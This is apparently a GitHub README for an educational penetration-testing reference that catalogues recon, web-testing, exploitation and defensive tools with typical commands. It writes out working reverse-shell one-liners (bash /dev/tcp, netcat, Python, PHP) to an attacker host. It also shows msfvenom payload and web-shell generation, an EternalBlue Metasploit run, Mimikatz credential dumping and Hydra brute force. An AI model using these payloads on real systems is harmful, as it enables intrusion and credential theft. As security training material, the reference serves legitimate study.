# 🔐 CyberVault

> A complete cybersecurity reference for recon, web testing, exploitation, privilege escalation, forensics, cloud security, and defense.

[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active-success?style=for-the-badge)](https://github.com/markehospes-art/CyberVault)
[![Repo Type](https://img.shields.io/badge/Type-Knowledge%20Base-orange?style=for-the-badge)](https://github.com/markehospes-art/CyberVault)

---

## 🚨 Important Notice

This repository is for educational, defensive, and authorized security research only.

Use it only in:
- Your own lab environment
- Authorized security engagements with written permission
- CTFs and training platforms
- Systems you own or explicitly maintain

Do not use this material for unauthorized access, exploitation, or malicious activity.

---

## 🧭 What This Repo Covers

CyberVault is a structured guide for the most important cybersecurity tools and workflows, including:

- Reconnaissance and OSINT
- Network scanning and enumeration
- Web application testing
- SQL injection and API security
- Exploit development and payload generation
- Privilege escalation
- Post-exploitation and persistence
- Windows and Active Directory fundamentals
- Linux hardening and user security
- Defensive monitoring and incident response
- Password attacks and credential security
- Reverse engineering and malware analysis
- Cloud security basics

---

## 🗂️ Repository Structure

```text
CyberVault/
├── README.md
├── TOOLS.md
├── LICENSE
├── CONTRIBUTING.md
├── SECURITY.md
├── CheatSheets/
│   ├── Nmap.md
│   ├── Reverse-Shells.md
│   ├── SQL-Injection-Quick-Ref.md
│   ├── Privilege-Escalation-Checklist.md
│   ├── Active-Directory-Quick-Ref.md
│   ├── Burp-Suite.md
│   ├── Metasploit.md
│   ├── Pivoting-Port-Forwarding.md
│   └── Home-Lab-Setup.md
├── Knowledge/
│   ├── Networking/
│   ├── Linux/
│   ├── Web-Security/
│   ├── Active-Directory/
│   ├── Password-Attacks/
│   ├── CTF/
│   ├── Wireless/
│   └── Cryptography/
├── Scripts/
│   ├── README.md
│   ├── advanced-recon.md
│   ├── exploitation-techniques.md
│   ├── privilege-escalation.md
│   ├── post-exploitation.md
│   └── defensive-hardening.md
├── .github/
│   └── README.md
└── .gitignore
```

---

## 🛠️ Core Tool Categories

### 1) Reconnaissance & Enumeration

These tools help discover hosts, services, open ports, subdomains, and exposed assets.

- Nmap
- Masscan
- Recon-ng
- Subfinder
- Amass
- Shodan
- TheHarvester
- Netcat
- Wireshark
- Zeek

### 2) Web Security Testing

- Burp Suite
- OWASP ZAP
- Nikto
- SQLMap
- Dirsearch
- Feroxbuster
- Wfuzz
- Gobuster

### 3) Exploitation & Payloads

- Metasploit
- Msfvenom
- Exploit-DB
- PowerShell Empire
- Veil Framework
- Searchsploit
- Sliver

### 4) Post-Exploitation & Persistence

- Mimikatz
- BloodHound
- Rubeus
- SharpHound
- PowerView
- Responder
- Evil-WinRM
- SSH tunneling and proxy tools

### 5) Password & Credential Security

- Hashcat
- John the Ripper
- Hydra
- Medusa
- CeWL
- Opencart? (not relevant)

### 6) Reverse Engineering & Forensics

- Ghidra
- Radare2
- objdump
- strings
- binwalk
- volatility
- Wireshark
- Autopsy

### 7) Defensive Security

- Fail2ban
- Suricata
- Snort
- OSSEC
- Wazuh
- Auditd
- YARA
- ClamAV

---

## 📘 Essential Tools and Commands

Below is a practical reference of widely used tools and their common command patterns.

### Nmap

```bash
# Basic scan
nmap target.example.com

# Scan specific ports
nmap -p 22,80,443 target.example.com

# Detect service versions
nmap -sV target.example.com

# OS detection
nmap -O target.example.com

# Aggressive scan
nmap -A target.example.com

# UDP scan
nmap -sU target.example.com

# Full port scan
nmap -p- target.example.com

# Save output
nmap -oN scan.txt target.example.com
nmap -oX scan.xml target.example.com

# Script scan
nmap --script vuln target.example.com
```

### Masscan

```bash
# Extremely fast scan of common ports
masscan 192.168.1.0/24 -p22,80,443 --rate=1000

# Full port scan
masscan 10.0.0.0/8 -p0-65535 --rate=10000
```

### Netcat

```bash
# Basic TCP connect
nc target.example.com 80

# Port scan
nc -zv target.example.com 22

# Listen on a port
nc -lvp 4444

# Reverse shell
nc attacker_ip 4444 -e /bin/bash

# File transfer
# On receiver
nc -lvp 4444 > received.txt

# On sender
nc target.example.com 4444 < file.txt
```

### Burp Suite

```bash
# Start Burp Suite
java -jar burpsuite_pro.jar

# Common web testing flow:
# 1. Set proxy to 127.0.0.1:8080
# 2. Intercept requests
# 3. Replay in Repeater
# 4. Use Intruder for fuzzing
# 5. Run scanner for issues
```

### SQLMap

```bash
# Basic detection
sqlmap -u "http://target.com/page.php?id=1"

# Show DBs
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Dump tables
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# Dump data
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=pass"
```

### Dirsearch / Gobuster

```bash
# Dirsearch
python3 dirsearch.py -u http://target.com -e php,html,txt

# Gobuster directory enum
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Subdomain enum
gobuster vhost -u http://site.com -w subdomains.txt
```

### Metasploit

```bash
msfconsole

# Search modules
search smb

# Use module
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 10.0.0.10
set LHOST 10.0.0.5
set LPORT 4444

# Run exploit
exploit
```

### Msfvenom

```bash
# Windows reverse shell EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > shell.exe

# Linux ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > shell.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > shell.php
```

### Hashcat

```bash
# Basic dictionary attack
hashcat -m 1000 hash.txt wordlist.txt

# MD5 attack
hashcat -m 0 hash.txt wordlist.txt

# Crack NTLM hashes
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Show cracked hashes
hashcat --show -m 1000 hashes.txt
```

### John the Ripper

```bash
# Wordlist attack
john --wordlist=wordlist.txt hashes.txt

# Show cracked results
john --show hashes.txt

# Dictionary + rules
john --wordlist=wordlist.txt --rules hashes.txt
```

### Hydra

```bash
# HTTP form login
hydra -l admin -P passwords.txt target.example.com http-form-post "/login:username=^USER^&password=^PASS^&submit=Login:F=incorrect"

# SSH brute force
hydra -l root -P passwords.txt target.example.com ssh
```

### TheHarvester

```bash
# Gather emails and subdomains
theharvester -d example.com -b google,bing

# Save results
theharvester -d example.com -b all -f results.html
```

### Subfinder / Amass

```bash
# Subfinder
subfinder -d example.com

# Amass enumeration
amass enum -d example.com
```

### Wireshark / Tshark

```bash
# Capture traffic
tshark -i eth0

# Save pcap
tshark -i eth0 -w capture.pcap

# Read pcap
tshark -r capture.pcap
```

### BloodHound

```bash
# Collect AD data
SharpHound.exe --CollectionMethod All

# Then load the JSON output in BloodHound GUI
```

### Mimikatz

```bash
mimikatz.exe

privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

### Responder

```bash
sudo responder -I eth0
```

### Ghidra / Radare2

```bash
# Ghidra GUI is often used for reverse engineering
# Radare2 basic use:
r2 -A binary
aaa
pdf @ main
```

### OpenSSL

```bash
# Generate a private key
openssl genrsa -out key.pem 2048

# Generate self-signed cert
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365

# View certificate
openssl x509 -in cert.pem -text -noout
```

---

## 🔍 Practical Recon Workflow

A typical workflow looks like this:

```bash
# 1. Discover hosts
nmap -sn 10.10.10.0/24

# 2. enumerate open ports
nmap -sS -sV -A 10.10.10.10

# 3. identify web apps
gobuster dir -u http://10.10.10.10 -w common.txt

# 4. find vulnerabilities
nikto -h http://10.10.10.10

# 5. test application logic
sqlmap -u "http://10.10.10.10/login?id=1" --dbs

# 6. escalate privileges
sudo -l
find / -perm -4000 2>/dev/null
```

---

## 🧪 Common Payloads & One-Liners

### Reverse Shells

```bash
# Bash reverse shell
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

# Netcat reverse shell
nc -e /bin/sh 10.0.0.5 4444

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP reverse shell
php -r '$sock=fsockopen("10.0.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### File Enumeration

```bash
# List files
ls -la

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Find world-writable files
find / -writable 2>/dev/null | head

# Check scheduled jobs
crontab -l
ls -la /etc/cron*
```

### Windows Enumeration

```powershell
# System info
systeminfo

# Local users and groups
net user
net localgroup administrators

# Privileges
whoami /priv

# Active Directory user listing
Get-ADUser -Filter *
```

---

## 🧠 Learning Paths

### Beginner Path

```text
Networking Basics → Linux Fundamentals → Nmap → Web Security → Burp Suite → CTF Practice
```

### Pentesting Path

```text
Recon → Enumeration → Exploitation → Privilege Escalation → Post-Exploitation → Reporting
```

### Blue Team / Defense Path

```text
Threat Modeling → Monitoring → SIEM → Linux/Windows Hardening → Incident Response → Forensics
```

### Web Security Path

```text
HTTP/HTTPS → OWASP Top 10 → SQLi → XSS → CSRF → API Security → Bug Bounty
```

---

## 📚 Recommended Resources

- TryHackMe
- Hack The Box
- PortSwigger Academy
- OWASP
- GTFOBins
- LOLBAS
- PayloadsAllTheThings
- MITRE ATT&CK
- Attack Matrix for Enterprise

---

## ⚖️ Ethical Use Policy

This project is intended to support legal, authorized security education and defense. It is not a malicious toolkit.

Stay within the law and the rules of your environment.

---

## 📝 Notes

This repo is meant to act as a living knowledge base. The goal is to keep improving it with:

- New tool entries
- Better explanations
- More command examples
- Updated references
- Additional attack and defense flow diagrams

---

## 📄 License

This repository is licensed under the MIT License. See [LICENSE](LICENSE) for details.

---

## 🔗 Quick Links

- [README](README.md)
- [Tools Reference](TOOLS.md)
- [Scripts Index](Scripts/README.md)
- [Contributing](CONTRIBUTING.md)
- [Security Policy](SECURITY.md)

---

<div align="center">

Built for learning. Used responsibly.

</div>
